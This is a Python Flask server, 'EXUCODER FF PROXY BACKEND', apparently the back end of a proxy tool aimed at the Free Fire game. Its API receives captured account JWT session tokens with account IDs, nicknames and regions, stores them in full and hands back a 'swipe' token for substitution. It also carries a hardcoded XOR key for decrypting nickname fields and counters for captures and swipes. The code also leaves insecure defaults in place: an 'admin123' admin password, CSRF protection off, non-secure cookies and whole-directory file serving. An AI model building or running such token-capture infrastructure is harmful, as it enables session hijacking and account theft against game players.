#!/usr/bin/env python3
"""
EXUCODER FF PROXY BACKEND - ALL IN ONE
JWT Capture & Swipe API Server
"""

import os
import sys
import json
import base64
import secrets
import time
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity, set_access_cookies, unset_jwt_cookies
from flask_sqlalchemy import SQLAlchemy
import bcrypt
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# =============================================================================
# CONFIGURATION
# =============================================================================

class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
    JWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY', secrets.token_hex(32))
    JWT_ACCESS_TOKEN_EXPIRES = timedelta(hours=24)
    JWT_TOKEN_LOCATION = ['headers', 'cookies']
    JWT_COOKIE_SECURE = False
    JWT_COOKIE_CSRF_PROTECT = False
    JWT_ACCESS_COOKIE_PATH = '/'
    
    SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URL', 'sqlite:///exucoder.db')
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    
    CORS_ORIGINS = os.environ.get('CORS_ORIGINS', 'http://localhost:5000,http://127.0.0.1:5000').split(',')
    
    ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

# =============================================================================
# DATABASE MODELS
# =============================================================================

db = SQLAlchemy()

def generate_api_key():
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return 'exu_' + ''.join(secrets.choice(alphabet) for _ in range(32))

class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    api_key = db.Column(db.String(100), unique=True, nullable=False, default=generate_api_key)
    role = db.Column(db.String(20), default='user')
    is_active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)
    jwts_captured = db.Column(db.Integer, default=0)
    jwts_swiped = db.Column(db.Integer, default=0)
    swipe_jwt = db.Column(db.Text, nullable=True)
    
    captured_jwts = db.relationship('CapturedJWT', backref='user', lazy=True, cascade='all, delete-orphan')
    proxy_logs = db.relationship('ProxyLog', backref='user', lazy=True, cascade='all, delete-orphan')
    
    def set_password(self, password):
        self.password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
    
    def check_password(self, password):
        return bcrypt.checkpw(password.encode('utf-8'), self.password_hash.encode('utf-8'))
    
    def to_dict(self, include_sensitive=False):
        data = {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'role': self.role,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'last_login': self.last_login.isoformat() if self.last_login else None,
            'jwts_captured': self.jwts_captured,
            'jwts_swiped': self.jwts_swiped,
            'has_swipe_jwt': bool(self.swipe_jwt)
        }
        if include_sensitive:
            data['api_key'] = self.api_key
        return data

class CapturedJWT(db.Model):
    __tablename__ = 'captured_jwts'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    jwt_token = db.Column(db.Text, nullable=False)
    source = db.Column(db.String(50))
    account_id = db.Column(db.String(100))
    nickname = db.Column(db.String(100))
    region = db.Column(db.String(20))
    country = db.Column(db.String(20))
    expiry = db.Column(db.DateTime)
    captured_at = db.Column(db.DateTime, default=datetime.utcnow)
    was_swiped = db.Column(db.Boolean, default=False)
    original_token = db.Column(db.Text, nullable=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'jwt_token': self.jwt_token[:50] + '...' if self.jwt_token else None,
            'full_jwt': self.jwt_token,
            'source': self.source,
            'account_id': self.account_id,
            'nickname': self.nickname,
            'region': self.region,
            'country': self.country,
            'expiry': self.expiry.isoformat() if self.expiry else None,
            'captured_at': self.captured_at.isoformat() if self.captured_at else None,
            'was_swiped': self.was_swiped
        }

class ProxyLog(db.Model):
    __tablename__ = 'proxy_logs'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    method = db.Column(db.String(10))
    url = db.Column(db.Text)
    action = db.Column(db.String(50))
    ip_address = db.Column(db.String(50))
    details = db.Column(db.Text)

# =============================================================================
# CREATE APP
# =============================================================================

# Since all files are in the same directory, use '.' instead of '../frontend'
app = Flask(__name__, 
            static_folder='.',
            template_folder='.')

# Load configuration
app.config.from_object(Config)

# Initialize extensions
cors_origins = app.config.get('CORS_ORIGINS', ['http://localhost:5000'])
CORS(app, supports_credentials=True, origins=cors_origins)
jwt = JWTManager(app)
db.init_app(app)

# =============================================================================
# INITIALIZE DATABASE
# =============================================================================

with app.app_context():
    db.create_all()
    
    admin = User.query.filter_by(username=Config.ADMIN_USERNAME).first()
    if not admin:
        admin = User(
            username=Config.ADMIN_USERNAME,
            email='admin@exucoder.com',
            role='admin'
        )
        admin.set_password(Config.ADMIN_PASSWORD)
        db.session.add(admin)
        db.session.commit()
        print(f"[+] Created admin user from .env")

# =============================================================================
# AUTHENTICATION DECORATORS
# =============================================================================

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        current_user_id = get_jwt_identity()
        if not current_user_id:
            return jsonify({'error': 'Authentication required'}), 401
        
        user = User.query.get(current_user_id)
        if not user or user.role != 'admin':
            return jsonify({'error': 'Admin access required'}), 403
        
        return f(*args, **kwargs)
    return decorated

def api_key_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if not api_key:
            return jsonify({'error': 'API key required'}), 401
        
        user = User.query.filter_by(api_key=api_key, is_active=True).first()
        if not user:
            return jsonify({'error': 'Invalid API key'}), 401
        
        request.user = user
        return f(*args, **kwargs)
    return decorated

# =============================================================================
# ROUTES - AUTHENTICATION
# =============================================================================

@app.route('/api/auth/register', methods=['POST'])
def register():
    data = request.get_json()
    
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')
    
    if not all([username, email, password]):
        return jsonify({'error': 'All fields required'}), 400
    
    if User.query.filter_by(username=username).first():
        return jsonify({'error': 'Username already exists'}), 400
    
    if User.query.filter_by(email=email).first():
        return jsonify({'error': 'Email already exists'}), 400
    
    if len(password) < 6:
        return jsonify({'error': 'Password must be at least 6 characters'}), 400
    
    user = User(username=username, email=email)
    user.set_password(password)
    
    db.session.add(user)
    db.session.commit()
    
    return jsonify({
        'message': 'User registered successfully',
        'user': user.to_dict(include_sensitive=True)
    }), 201

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.get_json()
    
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    
    user = User.query.filter_by(username=username).first()
    if not user or not user.check_password(password):
        return jsonify({'error': 'Invalid credentials'}), 401
    
    if not user.is_active:
        return jsonify({'error': 'Account is inactive'}), 403
    
    user.last_login = datetime.utcnow()
    db.session.commit()
    
    access_token = create_access_token(identity=user.id)
    
    response = jsonify({
        'message': 'Login successful',
        'user': user.to_dict(include_sensitive=True)
    })
    set_access_cookies(response, access_token)
    
    return response, 200

@app.route('/api/auth/logout', methods=['POST'])
@jwt_required()
def logout():
    response = jsonify({'message': 'Logged out successfully'})
    unset_jwt_cookies(response)
    return response, 200

@app.route('/api/auth/verify', methods=['GET'])
@jwt_required()
def verify_token():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    return jsonify(user.to_dict(include_sensitive=True)), 200

@app.route('/api/auth/regenerate-key', methods=['POST'])
@jwt_required()
def regenerate_api_key():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    user.api_key = generate_api_key()
    db.session.commit()
    
    return jsonify({
        'message': 'API key regenerated',
        'api_key': user.api_key
    }), 200

# =============================================================================
# ROUTES - USER MANAGEMENT
# =============================================================================

@app.route('/api/user/update', methods=['POST'])
@jwt_required()
def update_user():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    data = request.get_json()
    
    if 'username' in data:
        existing = User.query.filter_by(username=data['username']).first()
        if existing and existing.id != user.id:
            return jsonify({'error': 'Username already taken'}), 400
        user.username = data['username']
    
    if 'email' in data:
        existing = User.query.filter_by(email=data['email']).first()
        if existing and existing.id != user.id:
            return jsonify({'error': 'Email already taken'}), 400
        user.email = data['email']
    
    db.session.commit()
    
    return jsonify({
        'message': 'Profile updated',
        'user': user.to_dict(include_sensitive=True)
    }), 200

@app.route('/api/user/change-password', methods=['POST'])
@jwt_required()
def change_password():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    data = request.get_json()
    current_password = data.get('current_password')
    new_password = data.get('new_password')
    
    if not current_password or not new_password:
        return jsonify({'error': 'All fields required'}), 400
    
    if not user.check_password(current_password):
        return jsonify({'error': 'Current password is incorrect'}), 400
    
    if len(new_password) < 6:
        return jsonify({'error': 'Password must be at least 6 characters'}), 400
    
    user.set_password(new_password)
    db.session.commit()
    
    return jsonify({'message': 'Password changed successfully'}), 200

@app.route('/api/user/clear-data', methods=['POST'])
@jwt_required()
def clear_user_data():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    CapturedJWT.query.filter_by(user_id=user.id).delete()
    user.jwts_captured = 0
    user.jwts_swiped = 0
    user.swipe_jwt = None
    
    db.session.commit()
    
    return jsonify({'message': 'Data cleared successfully'}), 200

@app.route('/api/user/delete', methods=['DELETE'])
@jwt_required()
def delete_user():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    CapturedJWT.query.filter_by(user_id=user.id).delete()
    ProxyLog.query.filter_by(user_id=user.id).delete()
    db.session.delete(user)
    db.session.commit()
    
    response = jsonify({'message': 'Account deleted'})
    unset_jwt_cookies(response)
    return response, 200

# =============================================================================
# ROUTES - JWT MANAGEMENT
# =============================================================================

@app.route('/api/jwt/status', methods=['GET'])
@jwt_required()
def get_jwt_status():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    latest = CapturedJWT.query.filter_by(user_id=user.id)\
        .order_by(CapturedJWT.captured_at.desc()).first()
    
    return jsonify({
        'user_id': user.id,
        'username': user.username,
        'has_swipe_jwt': bool(user.swipe_jwt),
        'swipe_jwt_preview': user.swipe_jwt[:50] + '...' if user.swipe_jwt else None,
        'latest_captured': latest.to_dict() if latest else None,
        'total_captured': CapturedJWT.query.filter_by(user_id=user.id).count(),
        'stats': {
            'captured': user.jwts_captured,
            'swiped': user.jwts_swiped
        }
    }), 200

@app.route('/api/jwt/update', methods=['POST'])
@jwt_required()
def update_swipe_jwt():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    data = request.get_json()
    jwt_token = data.get('jwt_token')
    
    if not jwt_token:
        return jsonify({'error': 'JWT token required'}), 400
    
    if len(jwt_token.split('.')) != 3:
        return jsonify({'error': 'Invalid JWT format'}), 400
    
    user.swipe_jwt = jwt_token
    db.session.commit()
    
    return jsonify({
        'message': 'Swipe JWT updated successfully',
        'jwt_preview': jwt_token[:50] + '...'
    }), 200

@app.route('/api/jwt/clear', methods=['POST'])
@jwt_required()
def clear_swipe_jwt():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    user.swipe_jwt = None
    db.session.commit()
    
    return jsonify({'message': 'Swipe JWT cleared'}), 200

@app.route('/api/jwt/captured', methods=['GET'])
@jwt_required()
def get_captured_jwts():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 20, type=int)
    
    pagination = CapturedJWT.query.filter_by(user_id=user.id)\
        .order_by(CapturedJWT.captured_at.desc())\
        .paginate(page=page, per_page=per_page, error_out=False)
    
    return jsonify({
        'items': [item.to_dict() for item in pagination.items],
        'total': pagination.total,
        'page': page,
        'per_page': per_page,
        'pages': pagination.pages
    }), 200

@app.route('/api/jwt/decode', methods=['POST'])
def decode_jwt():
    data = request.get_json()
    jwt_token = data.get('jwt_token')
    
    if not jwt_token:
        return jsonify({'error': 'JWT token required'}), 400
    
    try:
        parts = jwt_token.split('.')
        if len(parts) != 3:
            return jsonify({'error': 'Invalid JWT format'}), 400
        
        header = base64.urlsafe_b64decode(parts[0] + '==').decode('utf-8')
        payload = base64.urlsafe_b64decode(parts[1] + '==').decode('utf-8')
        decoded = json.loads(payload)
        
        nickname_encrypted = decoded.get('nickname')
        nickname_decrypted = None
        if nickname_encrypted:
            try:
                xor_key = "1e5898ccb8dfdd921f9bdea848768b64a20"
                encrypted = base64.b64decode(nickname_encrypted)
                key_bytes = xor_key.encode('ascii')
                decrypted = bytes([encrypted[i] ^ key_bytes[i % len(key_bytes)] 
                                  for i in range(len(encrypted))])
                nickname_decrypted = decrypted.decode('utf-8')
            except:
                pass
        
        return jsonify({
            'header': json.loads(header),
            'payload': decoded,
            'nickname_decrypted': nickname_decrypted,
            'signature': parts[2][:20] + '...'
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 400

# =============================================================================
# ROUTES - PROXY INTEGRATION
# =============================================================================

@app.route('/api/proxy/capture', methods=['POST'])
@api_key_required
def proxy_capture_jwt():
    user = request.user
    data = request.get_json()
    
    jwt_token = data.get('jwt_token')
    source = data.get('source', 'unknown')
    account_id = data.get('account_id')
    nickname = data.get('nickname')
    region = data.get('region')
    country = data.get('country')
    
    captured = CapturedJWT(
        user_id=user.id,
        jwt_token=jwt_token,
        source=source,
        account_id=account_id,
        nickname=nickname,
        region=region,
        country=country
    )
    
    db.session.add(captured)
    user.jwts_captured += 1
    db.session.commit()
    
    should_swipe = bool(user.swipe_jwt)
    
    return jsonify({
        'status': 'captured',
        'id': captured.id,
        'should_swipe': should_swipe,
        'swipe_jwt': user.swipe_jwt if should_swipe else None
    }), 200

@app.route('/api/proxy/check', methods=['GET'])
@api_key_required
def proxy_check_swipe():
    user = request.user
    
    return jsonify({
        'user_id': user.id,
        'has_swipe_jwt': bool(user.swipe_jwt),
        'swipe_jwt': user.swipe_jwt if user.swipe_jwt else None
    }), 200

@app.route('/api/proxy/log', methods=['POST'])
@api_key_required
def proxy_log():
    user = request.user
    data = request.get_json()
    
    log = ProxyLog(
        user_id=user.id,
        method=data.get('method'),
        url=data.get('url'),
        action=data.get('action', 'forwarded'),
        ip_address=request.remote_addr,
        details=data.get('details')
    )
    
    db.session.add(log)
    db.session.commit()
    
    return jsonify({'status': 'logged'}), 200

# =============================================================================
# ROUTES - ADMIN
# =============================================================================

@app.route('/api/admin/users', methods=['GET'])
@jwt_required()
@admin_required
def admin_get_users():
    users = User.query.all()
    return jsonify({
        'users': [u.to_dict(include_sensitive=True) for u in users],
        'total': len(users)
    }), 200

@app.route('/api/admin/users/<int:user_id>/toggle', methods=['POST'])
@jwt_required()
@admin_required
def admin_toggle_user(user_id):
    user = User.query.get(user_id)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    data = request.get_json()
    activate = data.get('activate', True)
    
    user.is_active = activate
    db.session.commit()
    
    return jsonify({
        'message': f"User {'activated' if activate else 'deactivated'}",
        'is_active': activate
    }), 200

@app.route('/api/admin/users/<int:user_id>/role', methods=['POST'])
@jwt_required()
@admin_required
def admin_set_role(user_id):
    user = User.query.get(user_id)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    data = request.get_json()
    role = data.get('role', 'user')
    
    valid_roles = ['user', 'admin', 'moderator']
    if role not in valid_roles:
        return jsonify({'error': 'Invalid role'}), 400
    
    user.role = role
    db.session.commit()
    
    return jsonify({'message': f'Role set to {role}'}), 200

@app.route('/api/admin/users/<int:user_id>/delete', methods=['DELETE'])
@jwt_required()
@admin_required
def admin_delete_user(user_id):
    user = User.query.get(user_id)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    CapturedJWT.query.filter_by(user_id=user.id).delete()
    ProxyLog.query.filter_by(user_id=user.id).delete()
    db.session.delete(user)
    db.session.commit()
    
    return jsonify({'message': 'User deleted successfully'}), 200

@app.route('/api/admin/logs', methods=['GET'])
@jwt_required()
@admin_required
def admin_get_logs():
    limit = request.args.get('limit', 50, type=int)
    action = request.args.get('action')
    
    query = ProxyLog.query.order_by(ProxyLog.timestamp.desc())
    if action:
        query = query.filter_by(action=action)
    
    logs = query.limit(limit).all()
    
    return jsonify({
        'logs': [{
            'id': log.id,
            'user_id': log.user_id,
            'username': log.user.username if log.user else 'Unknown',
            'timestamp': log.timestamp.isoformat(),
            'method': log.method,
            'url': log.url,
            'action': log.action,
            'ip_address': log.ip_address,
            'details': log.details
        } for log in logs],
        'total': len(logs)
    }), 200

@app.route('/api/admin/stats', methods=['GET'])
@jwt_required()
@admin_required
def admin_get_stats():
    users_count = User.query.count()
    jwts_count = CapturedJWT.query.count()
    swipes_count = ProxyLog.query.filter_by(action='swiped').count()
    
    from datetime import datetime, timedelta
    yesterday = datetime.utcnow() - timedelta(hours=24)
    active_users = db.session.query(ProxyLog.user_id)\
        .filter(ProxyLog.timestamp >= yesterday)\
        .distinct().count()
    
    return jsonify({
        'users': users_count,
        'jwts': jwts_count,
        'swipes': swipes_count,
        'active_users': active_users,
        'timestamp': int(time.time())
    }), 200

@app.route('/api/admin/clear-data', methods=['POST'])
@jwt_required()
@admin_required
def admin_clear_data():
    CapturedJWT.query.delete()
    ProxyLog.query.delete()
    User.query.update({
        'jwts_captured': 0,
        'jwts_swiped': 0,
        'swipe_jwt': None
    })
    db.session.commit()
    
    return jsonify({'message': 'All data cleared successfully'}), 200

# =============================================================================
# ROUTES - STATIC FILES (SAME DIRECTORY)
# =============================================================================

@app.route('/')
def index():
    """Serve login page"""
    return send_from_directory('.', 'login.html')

@app.route('/login')
def login_page():
    """Serve login page"""
    return send_from_directory('.', 'login.html')

@app.route('/dashboard')
def dashboard():
    """Serve dashboard page"""
    return send_from_directory('.', 'dashboard.html')

@app.route('/settings')
def settings():
    """Serve settings page"""
    return send_from_directory('.', 'settings.html')

@app.route('/admin')
def admin():
    """Serve admin panel"""
    return send_from_directory('.', 'admin.html')

@app.route('/help')
def help():
    """Serve help page"""
    return send_from_directory('.', 'help.html')

@app.route('/<path:path>')
def serve_static(path):
    """Serve static files"""
    return send_from_directory('.', path)

# =============================================================================
# MAIN
# =============================================================================

if __name__ == '__main__':
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  🚀 EXUCODER FF PROXY BACKEND STARTED                        ║
║  📍 http://localhost:5000                                    ║
║  📍 http://localhost:5000/login     (Login)                 ║
║  📍 http://localhost:5000/dashboard  (Dashboard)            ║
║  📍 http://localhost:5000/admin      (Admin Panel)          ║
║  📍 http://localhost:5000/settings   (Settings)             ║
║  📍 http://localhost:5000/help       (Help)                 ║
║                                                             ║
║  📦 SQLite Database: exucoder.db                            ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=False)